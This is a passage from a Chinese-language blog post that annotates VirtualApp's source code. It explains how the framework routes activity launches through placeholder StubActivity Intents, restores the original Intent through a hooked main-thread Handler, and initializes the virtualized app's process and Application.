class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逻辑最终走到 <code>VAMS</code> <code>后，VAMS</code> 调用 <code>ActivityStack</code>.<code>startActivityLocked</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 参考 framework 的实现</span><br><span class="line">int startActivityLocked(int userId, Intent intent, ActivityInfo info, IBinder resultTo, Bundle options,</span><br><span class="line">                        String resultWho, int requestCode) &#123;</span><br><span class="line">    optimizeTasksLocked();</span><br><span class="line"></span><br><span class="line">    Intent destIntent;</span><br><span class="line">    ActivityRecord sourceRecord = findActivityByToken(userId, resultTo);</span><br><span class="line">    TaskRecord sourceTask = sourceRecord != null ? sourceRecord.task : null;</span><br><span class="line"></span><br><span class="line">    ReuseTarget reuseTarget = ReuseTarget.CURRENT;</span><br><span class="line">    ClearTarget clearTarget = ClearTarget.NOTHING;</span><br><span class="line">    boolean clearTop = containFlags(intent, Intent.FLAG_ACTIVITY_CLEAR_TOP);</span><br><span class="line">    boolean clearTask = containFlags(intent, Intent.FLAG_ACTIVITY_CLEAR_TASK);</span><br><span class="line"></span><br><span class="line">    if (intent.getComponent() == null) &#123;</span><br><span class="line">        intent.setComponent(new ComponentName(info.packageName, info.name));</span><br><span class="line">    &#125;</span><br><span class="line">    if (sourceRecord != null &amp;&amp; sourceRecord.launchMode == LAUNCH_SINGLE_INSTANCE) &#123;</span><br><span class="line">        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">    &#125;</span><br><span class="line">    if (clearTop) &#123;</span><br><span class="line">        removeFlags(intent, Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);</span><br><span class="line">        clearTarget = ClearTarget.TOP;</span><br><span class="line">    &#125;</span><br><span class="line">    if (clearTask) &#123;</span><br><span class="line">        if (containFlags(intent, Intent.FLAG_ACTIVITY_NEW_TASK)) &#123;</span><br><span class="line">            clearTarget = ClearTarget.TASK;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            removeFlags(intent, Intent.FLAG_ACTIVITY_CLEAR_TASK);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) &#123;</span><br><span class="line">        switch (info.documentLaunchMode) &#123;</span><br><span class="line">            case ActivityInfo.DOCUMENT_LAUNCH_INTO_EXISTING:</span><br><span class="line">                clearTarget = ClearTarget.TASK;</span><br><span class="line">                reuseTarget = ReuseTarget.DOCUMENT;</span><br><span class="line">                break;</span><br><span class="line">            case ActivityInfo.DOCUMENT_LAUNCH_ALWAYS:</span><br><span class="line">                reuseTarget = ReuseTarget.MULTIPLE;</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    boolean singleTop = false;</span><br><span class="line"></span><br><span class="line">    switch (info.launchMode) &#123;</span><br><span class="line">        case LAUNCH_SINGLE_TOP: &#123;</span><br><span class="line">            singleTop = true;</span><br><span class="line">            if (containFlags(intent, Intent.FLAG_ACTIVITY_NEW_TASK)) &#123;</span><br><span class="line">                reuseTarget = containFlags(intent, Intent.FLAG_ACTIVITY_MULTIPLE_TASK)</span><br><span class="line">                        ? ReuseTarget.MULTIPLE</span><br><span class="line">                        : ReuseTarget.AFFINITY;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">        case LAUNCH_SINGLE_TASK: &#123;</span><br><span class="line">            clearTop = false;</span><br><span class="line">            clearTarget = ClearTarget.TOP;</span><br><span class="line">            reuseTarget = containFlags(intent, Intent.FLAG_ACTIVITY_MULTIPLE_TASK)</span><br><span class="line">                    ? ReuseTarget.MULTIPLE</span><br><span class="line">                    : ReuseTarget.AFFINITY;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">        case LAUNCH_SINGLE_INSTANCE: &#123;</span><br><span class="line">            clearTop = false;</span><br><span class="line">            clearTarget = ClearTarget.TOP;</span><br><span class="line">            reuseTarget = ReuseTarget.AFFINITY;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">        default: &#123;</span><br><span class="line">            if (containFlags(intent, Intent.FLAG_ACTIVITY_SINGLE_TOP)) &#123;</span><br><span class="line">                singleTop = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    if (clearTarget == ClearTarget.NOTHING) &#123;</span><br><span class="line">        if (containFlags(intent, Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)) &#123;</span><br><span class="line">            clearTarget = ClearTarget.SPEC_ACTIVITY;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (sourceTask == null &amp;&amp; reuseTarget == ReuseTarget.CURRENT) &#123;</span><br><span class="line">        reuseTarget = ReuseTarget.AFFINITY;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String affinity = ComponentUtils.getTaskAffinity(info);</span><br><span class="line"></span><br><span class="line">    // 根据 Flag 寻找合适的 Task</span><br><span class="line">    TaskRecord reuseTask = null;</span><br><span class="line">    switch (reuseTarget) &#123;</span><br><span class="line">        case AFFINITY:</span><br><span class="line">            reuseTask = findTaskByAffinityLocked(userId, affinity);</span><br><span class="line">            break;</span><br><span class="line">        case DOCUMENT:</span><br><span class="line">            reuseTask = findTaskByIntentLocked(userId, intent);</span><br><span class="line">            break;</span><br><span class="line">        case CURRENT:</span><br><span class="line">            reuseTask = sourceTask;</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    boolean taskMarked = false;</span><br><span class="line">    if (reuseTask == null) &#123;</span><br><span class="line">        startActivityInNewTaskLocked(userId, intent, info, options);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        boolean delivered = false;</span><br><span class="line">        mAM.moveTaskToFront(reuseTask.taskId, 0);</span><br><span class="line">        boolean startTaskToFront = !clearTask &amp;&amp; !clearTop &amp;&amp; ComponentUtils.isSameIntent(intent, reuseTask.taskRoot);</span><br><span class="line"></span><br><span class="line">        if (clearTarget.deliverIntent || singleTop) &#123;</span><br><span class="line">            taskMarked = markTaskByClearTarget(reuseTask, clearTarget, intent.getComponent());</span><br><span class="line">            ActivityRecord topRecord = topActivityInTask(reuseTask);</span><br><span class="line">            if (clearTop &amp;&amp; !singleTop &amp;&amp; topRecord != null &amp;&amp; taskMarked) &#123;</span><br><span class="line">                topRecord.marked = true;</span><br><span class="line">            &#125;</span><br><span class="line">            // Target activity is on top</span><br><span class="line">            if (topRecord != null &amp;&amp; !topRecord.marked &amp;&amp; topRecord.component.equals(intent.getComponent())) &#123;</span><br><span class="line">                deliverNewIntentLocked(sourceRecord, topRecord, intent);</span><br><span class="line">                delivered = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (taskMarked) &#123;</span><br><span class="line">            synchronized (mHistory) &#123;</span><br><span class="line">                scheduleFinishMarkedActivityLocked();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!startTaskToFront) &#123;</span><br><span class="line">            if (!delivered) &#123;</span><br><span class="line">                destIntent = startActivityProcess(userId, sourceRecord, intent, info);</span><br><span class="line">                if (destIntent != null) &#123;</span><br><span class="line">                    startActivityFromSourceTask(reuseTask, destIntent, info, resultWho, requestCode, options);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后 <code>call</code> 到了 <code>startActivityProcess</code> ，这就是真正替换 <code>Intent</code> 的地方。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 使用 Host Stub Activity 的 Intent 包装原 Intent 瞒天过海</span><br><span class="line">private Intent startActivityProcess(int userId, ActivityRecord sourceRecord, Intent intent, ActivityInfo info) &#123;</span><br><span class="line">    intent = new Intent(intent);</span><br><span class="line">    // 获得 Activity 对应的 ProcessRecorder，如果没有则表示这是 Process 第一个打开的组件，需要初始化 Application</span><br><span class="line">    ProcessRecord targetApp = mService.startProcessIfNeedLocked(info.processName, userId, info.packageName);</span><br><span class="line">    if (targetApp == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    Intent targetIntent = new Intent();</span><br><span class="line"></span><br><span class="line">    // 根据 Client App 的 PID 获取 StubActivity</span><br><span class="line">    String stubActivityPath = fetchStubActivity(targetApp.vpid, info);</span><br><span class="line"></span><br><span class="line">    Log.e(&quot;gy&quot;, &quot;map activity:&quot; + intent.getComponent().getClassName() + &quot; -&gt; &quot; + stubActivityPath);</span><br><span class="line"></span><br><span class="line">    targetIntent.setClassName(VirtualCore.get().getHostPkg(), stubActivityPath);</span><br><span class="line">    ComponentName component = intent.getComponent();</span><br><span class="line">    if (component == null) &#123;</span><br><span class="line">        component = ComponentUtils.toComponentName(info);</span><br><span class="line">    &#125;</span><br><span class="line">    targetIntent.setType(component.flattenToString());</span><br><span class="line">    StubActivityRecord saveInstance = new StubActivityRecord(intent, info,</span><br><span class="line">            sourceRecord != null ? sourceRecord.component : null, userId);</span><br><span class="line">    saveInstance.saveToIntent(targetIntent);</span><br><span class="line">    return targetIntent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>fetchStubActivity</code> 会根据相同的进程 <code>id</code> 在 <code>VA</code> 的 <code>Menifest</code> 中找到那个提前占坑的 <code>StubActivity</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 获取合适的 StubActivity，返回 StubActivity 全限定名</span><br><span class="line">private String fetchStubActivity(int vpid, ActivityInfo targetInfo) &#123;</span><br><span class="line"></span><br><span class="line">    boolean isFloating = false;</span><br><span class="line">    boolean isTranslucent = false;</span><br><span class="line">    boolean showWallpaper = false;</span><br><span class="line">    try &#123;</span><br><span class="line">        int[] R_Styleable_Window = R_Hide.styleable.Window.get();</span><br><span class="line">        int R_Styleable_Window_windowIsTranslucent = R_Hide.styleable.Window_windowIsTranslucent.get();</span><br><span class="line">        int R_Styleable_Window_windowIsFloating = R_Hide.styleable.Window_windowIsFloating.get();</span><br><span class="line">        int R_Styleable_Window_windowShowWallpaper = R_Hide.styleable.Window_windowShowWallpaper.get();</span><br><span class="line"></span><br><span class="line">        AttributeCache.Entry ent = AttributeCache.instance().get(targetInfo.packageName, targetInfo.theme,</span><br><span class="line">                R_Styleable_Window);</span><br><span class="line">        if (ent != null &amp;&amp; ent.array != null) &#123;</span><br><span class="line">            showWallpaper = ent.array.getBoolean(R_Styleable_Window_windowShowWallpaper, false);</span><br><span class="line">            isTranslucent = ent.array.getBoolean(R_Styleable_Window_windowIsTranslucent, false);</span><br><span class="line">            isFloating = ent.array.getBoolean(R_Styleable_Window_windowIsFloating, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    boolean isDialogStyle = isFloating || isTranslucent || showWallpaper;</span><br><span class="line"></span><br><span class="line">    // 根据在 Menifest 中注册的 pid</span><br><span class="line">    if (isDialogStyle) &#123;</span><br><span class="line">        return VASettings.getStubDialogName(vpid);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return VASettings.getStubActivityName(vpid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里需要特别注意， <code>VA</code> 占坑的方式和 <code>DroidPlugin</code> <code>有些小不同，VA</code> 没有为每个 <code>Process</code> 注册多个 <code>Activity</code> ，也没有为不同的启动方式注册多个 <code>Activity</code> ，这里确实是有改进的。</p>
<p>这里根本原因是因为 <code>VA</code> 对 <code>VAMS</code> 实现的更为完整，实现了原版 <code>AMS</code> 的基本功能，包括完整的 <code>Recorder</code> 管理，<code>Task Stack</code> 管理等，这样的话 <code>StubActivity</code> 的唯一作用便是携带 <code>Client App</code> 真正的 <code>Intent</code> 交给 <code>VAMS</code> 处理。这套机制衍生到其他的组件也是一样的。</p>
<p>可以简单看一下 <code>ActivityStack，</code> 、 <code>ActivityRecorder</code> 、 <code>ActivityRecord</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* package */ class ActivityStack &#123;</span><br><span class="line"></span><br><span class="line">    private final ActivityManager mAM;</span><br><span class="line">    private final VActivityManagerService mService;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * [Key] = TaskId [Value] = TaskRecord</span><br><span class="line">     */</span><br><span class="line">    private final SparseArray&lt;TaskRecord&gt; mHistory = new SparseArray&lt;&gt;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TaskRecord &#123;</span><br><span class="line">    public final List&lt;ActivityRecord&gt; activities = Collections.synchronizedList(new ArrayList&lt;ActivityRecord&gt;());</span><br><span class="line">    public int taskId;</span><br><span class="line">    public int userId;</span><br><span class="line">    public String affinity;</span><br><span class="line">    public Intent taskRoot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* package */ class ActivityRecord &#123;</span><br><span class="line">    public TaskRecord task;</span><br><span class="line">    public ComponentName component;</span><br><span class="line">    public ComponentName caller;</span><br><span class="line">    // Client App 中 Activity 的句柄</span><br><span class="line">    public IBinder token;</span><br><span class="line">    public int userId;</span><br><span class="line">    public ProcessRecord process;</span><br><span class="line">    public int launchMode;</span><br><span class="line">    public int flags;</span><br><span class="line">    public boolean marked;</span><br><span class="line">    public String affinity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>StubActivityRecorder</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class StubActivityRecord  &#123;</span><br><span class="line">        public Intent intent;</span><br><span class="line">        public ActivityInfo info;</span><br><span class="line">        public ComponentName caller;</span><br><span class="line">        public int userId;</span><br><span class="line"></span><br><span class="line">        public StubActivityRecord(Intent intent, ActivityInfo info, ComponentName caller, int userId) &#123;</span><br><span class="line">            this.intent = intent;</span><br><span class="line">            this.info = info;</span><br><span class="line">            this.caller = caller;</span><br><span class="line">            this.userId = userId;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 获取原版 Intent 和一些其他信息</span><br><span class="line">        public StubActivityRecord(Intent stub) &#123;</span><br><span class="line">            this.intent = stub.getParcelableExtra(&quot;_VA_|_intent_&quot;);</span><br><span class="line">            this.info = stub.getParcelableExtra(&quot;_VA_|_info_&quot;);</span><br><span class="line">            this.caller = stub.getParcelableExtra(&quot;_VA_|_caller_&quot;);</span><br><span class="line">            this.userId = stub.getIntExtra(&quot;_VA_|_user_id_&quot;, 0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    // 将原版 Intent 塞到 Stub Intent</span><br><span class="line">    public void saveToIntent(Intent stub) &#123;</span><br><span class="line">        stub.putExtra(&quot;_VA_|_intent_&quot;, intent);</span><br><span class="line">        stub.putExtra(&quot;_VA_|_info_&quot;, info);</span><br><span class="line">        stub.putExtra(&quot;_VA_|_caller_&quot;, caller);</span><br><span class="line">        stub.putExtra(&quot;_VA_|_user_id_&quot;, userId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="初始化-Application"><a href="#初始化-Application" class="headerlink" title="初始化 Application"></a>初始化 Application</h2><p>还有一个非常重要的事情，注意到这一行 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 获得 Activity 对应的 ProcessRecorder，如果没有则表示这是 Process 第一个打开的组件，需要初始化 Application</span><br><span class="line">ProcessRecord targetApp = mService.startProcessIfNeedLocked(info.processName, userId, info.packageName);</span><br></pre></td></tr></table></figure>
<p>这里会先去找对应 <code>Client App</code> 进程的 <code>ProcessRecorder</code> , 找不到代表 <code>Application</code> 刚启动尚未初始化:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private ProcessRecord performStartProcessLocked(int vuid, int vpid, ApplicationInfo info, String processName) &#123;</span><br><span class="line">    ProcessRecord app = new ProcessRecord(info, processName, vuid, vpid);</span><br><span class="line">    Bundle extras = new Bundle();</span><br><span class="line">    BundleCompat.putBinder(extras, &quot;_VA_|_binder_&quot;, app);</span><br><span class="line">    extras.putInt(&quot;_VA_|_vuid_&quot;, vuid);</span><br><span class="line">    extras.putString(&quot;_VA_|_process_&quot;, processName);</span><br><span class="line">    extras.putString(&quot;_VA_|_pkg_&quot;, info.packageName);</span><br><span class="line"></span><br><span class="line">    // 调用子程序包的 init_process 方法，并且得到子程序包 IBinder 句柄</span><br><span class="line">    Bundle res = ProviderCall.call(VASettings.getStubAuthority(vpid), &quot;_VA_|_init_process_&quot;, null, extras);</span><br><span class="line">    if (res == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    int pid = res.getInt(&quot;_VA_|_pid_&quot;);</span><br><span class="line">    IBinder clientBinder = BundleCompat.getBinder(res, &quot;_VA_|_client_&quot;);</span><br><span class="line">    // attach 到 Client 的 VAM</span><br><span class="line">    attachClient(pid, clientBinder);</span><br><span class="line">    return app;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ProviderCall.call</code> 向 <code>Client App</code> 的 <code>StubContentProvider</code> 发起远程调用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">public Bundle call(String method, String arg, Bundle extras) &#123;</span><br><span class="line">    if (&quot;_VA_|_init_process_&quot;.equals(method)) &#123;</span><br><span class="line">        return initProcess(extras);</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private Bundle initProcess(Bundle extras) &#123;</span><br><span class="line">    ConditionVariable lock = VirtualCore.get().getInitLock();</span><br><span class="line">    if (lock != null) &#123;</span><br><span class="line">        lock.block();</span><br><span class="line">    &#125;</span><br><span class="line">    IBinder token = BundleCompat.getBinder(extras,&quot;_VA_|_binder_&quot;);</span><br><span class="line">    int vuid = extras.getInt(&quot;_VA_|_vuid_&quot;);</span><br><span class="line">    VClientImpl client = VClientImpl.get();</span><br><span class="line">    client.initProcess(token, vuid);</span><br><span class="line">    Bundle res = new Bundle();</span><br><span class="line">    BundleCompat.putBinder(res, &quot;_VA_|_client_&quot;, client.asBinder());</span><br><span class="line">    res.putInt(&quot;_VA_|_pid_&quot;, Process.myPid());</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Client App</code> 的 <code>IBinder</code> 句柄(<code>VClientImpl.asBinder</code>) 被打包在了 <code>Bundle</code> 中返回给 <code>VAMS</code> 。</p>
<p>最终 <code>VAMS</code> 调用原生 <code>AM</code> 的 <code>startActivity</code> 向真正的 <code>AMS</code> 发送替换成 <code>StubActivity</code> 的伪造 <code>Intent</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mirror.android.app.IActivityManager.startActivity.call(ActivityManagerNative.getDefault.call(), (Object[]) args);</span><br></pre></td></tr></table></figure>

<h2 id="恢复原-Intent-重定向到原-Activity"><a href="#恢复原-Intent-重定向到原-Activity" class="headerlink" title="恢复原 Intent 重定向到原 Activity"></a>恢复原 Intent 重定向到原 Activity</h2><p>当 <code>AMS</code> 收到伪装的 <code>Intent</code> 后，就会找到 <code>StubActivity</code> ，这时流程回到 <code>VA</code> 里的主线程中的消息队列中。</p>
<p><code>Hook</code> 过程就是用我们自己的 <code>Handler</code> 替换 <code>android.os.Handler.mCallback</code> 因为主线程在这里分发一些操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">public void inject() throws Throwable &#123;</span><br><span class="line">    otherCallback = getHCallback();</span><br><span class="line">    mirror.android.os.Handler.mCallback.set(getH(), this);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handlerMessage</code> 判断是 <code>LAUNCH_ACTIVITY Action</code> 后直接调用了 <code>handlerLaunchActivity</code> 方法，和原版其实很像。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private boolean handleLaunchActivity(Message msg) &#123;</span><br><span class="line">    Object r = msg.obj;</span><br><span class="line">    Intent stubIntent = ActivityThread.ActivityClientRecord.intent.get(r);</span><br><span class="line">    // 获取原版 Intent 信息</span><br><span class="line">    StubActivityRecord saveInstance = new StubActivityRecord(stubIntent);</span><br><span class="line">    if (saveInstance.intent == null) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    // 原版 Intent</span><br><span class="line">    Intent intent = saveInstance.intent;</span><br><span class="line">    ComponentName caller = saveInstance.caller;</span><br><span class="line">    IBinder token = ActivityThread.ActivityClientRecord.token.get(r);</span><br><span class="line">    ActivityInfo info = saveInstance.info;</span><br><span class="line"></span><br><span class="line">    // 如果 token 还没初始化，代表 App 刚刚启动第一个组件</span><br><span class="line">    if (VClientImpl.get().getToken() == null) &#123;</span><br><span class="line">        VActivityManager.get().processRestarted(info.packageName, info.processName, saveInstance.userId);</span><br><span class="line">        getH().sendMessageAtFrontOfQueue(Message.obtain(msg));</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    // AppBindData 为空，则 App 信息不明</span><br><span class="line">    if (!VClientImpl.get().isBound()) &#123;</span><br><span class="line">        // 初始化并绑定 Application</span><br><span class="line">        VClientImpl.get().bindApplication(info.packageName, info.processName);</span><br><span class="line">        getH().sendMessageAtFrontOfQueue(Message.obtain(msg));</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取 TaskId</span><br><span class="line">    int taskId = IActivityManager.getTaskForActivity.call(</span><br><span class="line">            ActivityManagerNative.getDefault.call(),</span><br><span class="line">            token,</span><br><span class="line">            false</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 1.将 ActivityRecorder 加入 mActivities 2.通知服务端 VAMS Activity 创建完成</span><br><span class="line">    VActivityManager.get().onActivityCreate(ComponentUtils.toComponentName(info), caller, token, info, intent, ComponentUtils.getTaskAffinity(info), taskId, info.launchMode, info.flags);</span><br><span class="line">    ClassLoader appClassLoader = VClientImpl.get().getClassLoader(info.applicationInfo);</span><br><span class="line">    intent.setExtrasClassLoader(appClassLoader);</span><br><span class="line">    // 将 Host Stub Activity Intent 替换为原版 Intent</span><br><span class="line">    ActivityThread.ActivityClientRecord.intent.set(r, intent);</span><br><span class="line">    // 同上</span><br><span class="line">    ActivityThread.ActivityClientRecord.activityInfo.set(r, info);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是，如果这个 <code>Activity</code> 是这个 <code>Apk</code> 启动的第一个组件，则需要 <code>bindApplication</code> 初始化 <code>Application</code> 操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void bindApplicationNoCheck(String packageName, String processName, ConditionVariable lock) &#123;</span><br><span class="line">    mTempLock = lock;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 设置未捕获异常的 Callback</span><br><span class="line">        setupUncaughtHandler();</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 修复 Provider 信息</span><br><span class="line">        fixInstalledProviders();</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    mirror.android.os.Build.SERIAL.set(deviceInfo.serial);</span><br><span class="line">    mirror.android.os.Build.DEVICE.set(Build.DEVICE.replace(&quot; &quot;, &quot;_&quot;));</span><br><span class="line">    ActivityThread.mInitialApplication.set(</span><br><span class="line">            VirtualCore.mainThread(),</span><br><span class="line">            null</span><br><span class="line">    );</span><br><span class="line">    // 从 VPMS 获取 apk 信息</span><br><span class="line">    AppBindData data = new AppBindData();</span><br><span class="line">    InstalledAppInfo info = VirtualCore.get().getInstalledAppInfo(packageName, 0);</span><br><span class="line">    if (info == null) &#123;</span><br><span class="line">        new Exception(&quot;App not exist!&quot;).printStackTrace();</span><br><span class="line">        Process.killProcess(0);</span><br><span class="line">        System.exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    // dex 优化的开关，dalvik 和 art 处理不同</span><br><span class="line">    if (!info.dependSystem &amp;&amp; info.skipDexOpt) &#123;</span><br><span class="line">        VLog.d(TAG, &quot;Dex opt skipped.&quot;);</span><br><span class="line">        if (VirtualRuntime.isArt()) &#123;</span><br><span class="line">            ARTUtils.init(VirtualCore.get().getContext());</span><br><span class="line">            ARTUtils.setIsDex2oatEnabled(false);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            DalvikUtils.init();</span><br><span class="line">            DalvikUtils.setDexOptMode(DalvikUtils.OPTIMIZE_MODE_NONE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    data.appInfo = VPackageManager.get().getApplicationInfo(packageName, 0, getUserId(vuid));</span><br><span class="line">    data.processName = processName;</span><br><span class="line">    data.providers = VPackageManager.get().queryContentProviders(processName, getVUid(), PackageManager.GET_META_DATA);</span><br><span class="line">    Log.i(TAG, &quot;Binding application &quot; + data.appInfo.packageName + &quot; (&quot; + data.processName + &quot;)&quot;);</span><br><span class="line">    mBoundApplication = data;</span><br><span class="line">    // 主要设置进程的名字</span><br><span class="line">    VirtualRuntime.setupRuntime(data.processName, data.appInfo);</span><br><span class="line">    int targetSdkVersion = data.appInfo.targetSdkVersion;</span><br><span class="line">    if (targetSdkVersion &lt; Build.VERSION_CODES.GINGERBREAD) &#123;</span><br><span class="line">        StrictMode.ThreadPolicy newPolicy = new StrictMode.ThreadPolicy.Builder(StrictMode.getThreadPolicy()).permitNetwork().build();</span><br><span class="line">        StrictMode.setThreadPolicy(newPolicy);</span><br><span class="line">    &#125;</span><br><span class="line">    if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.N) &#123;</span><br><span class="line">        if (mirror.android.os.StrictMode.sVmPolicyMask != null) &#123;</span><br><span class="line">            mirror.android.os.StrictMode.sVmPolicyMask.set(0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP &amp;&amp; targetSdkVersion &lt; Build.VERSION_CODES.LOLLIPOP) &#123;</span><br><span class="line">        mirror.android.os.Message.updateCheckRecycle.call(targetSdkVersion);</span><br><span class="line">    &#125;</span><br><span class="line">    if (VASettings.ENABLE_IO_REDIRECT) &#123;</span><br><span class="line">        // IO 重定向</span><br><span class="line">        startIOUniformer();</span><br><span class="line">    &#125;</span><br><span class="line">    // hook native 函数</span><br><span class="line">    NativeEngine.hookNative();</span><br><span class="line">    Object mainThread = VirtualCore.mainThread();</span><br><span class="line">    // 准备 dex 列表</span><br><span class="line">    NativeEngine.startDexOverride();</span><br><span class="line">    // 获得子 pkg 的 Context 前提是必须在系统中安装的（疑问？）</span><br><span class="line">    Context context = createPackageContext(data.appInfo.packageName);</span><br><span class="line">    // 设置虚拟机系统环境 临时文件夹 codeCacheDir</span><br><span class="line">    System.setProperty(&quot;java.io.tmpdir&quot;, context.getCacheDir().getAbsolutePath());</span><br><span class="line">    // oat 的 cache 目录</span><br><span class="line">    File codeCacheDir;</span><br><span class="line">    if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) &#123;</span><br><span class="line">        codeCacheDir = context.getCodeCacheDir();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        codeCacheDir = context.getCacheDir();</span><br><span class="line">    &#125;</span><br><span class="line">    // 硬件加速的 cache 目录</span><br><span class="line">    if (Build.VERSION.SDK_INT &lt; Build.VERSION_CODES.N) &#123;</span><br><span class="line">        if (HardwareRenderer.setupDiskCache != null) &#123;</span><br><span class="line">            HardwareRenderer.setupDiskCache.call(codeCacheDir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if (ThreadedRenderer.setupDiskCache != null) &#123;</span><br><span class="line">            ThreadedRenderer.setupDiskCache.call(codeCacheDir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) &#123;</span><br><span class="line">        if (RenderScriptCacheDir.setupDiskCache != null) &#123;</span><br><span class="line">            RenderScriptCacheDir.setupDiskCache.call(codeCacheDir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.JELLY_BEAN) &#123;</span><br><span class="line">        if (RenderScript.setupDiskCache != null) &#123;</span><br><span class="line">            RenderScript.setupDiskCache.call(codeCacheDir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 修复子 App 中 ActivityThread.AppBinderData 的参数，因为之前用的是在 Host 程序中注册的 Stub 的信息</span><br><span class="line">    Object boundApp = fixBoundApp(mBoundApplication);</span><br><span class="line">    mBoundApplication.info = ContextImpl.mPackageInfo.get(context);</span><br><span class="line">    mirror.android.app.ActivityThread.AppBindData.info.set(boundApp, data.info);</span><br><span class="line"></span><br><span class="line">    // 同样修复 targetSdkVersion 原来也是可 Host 程序一样的</span><br><span class="line">    VMRuntime.setTargetSdkVersion.call(VMRuntime.getRuntime.call(), 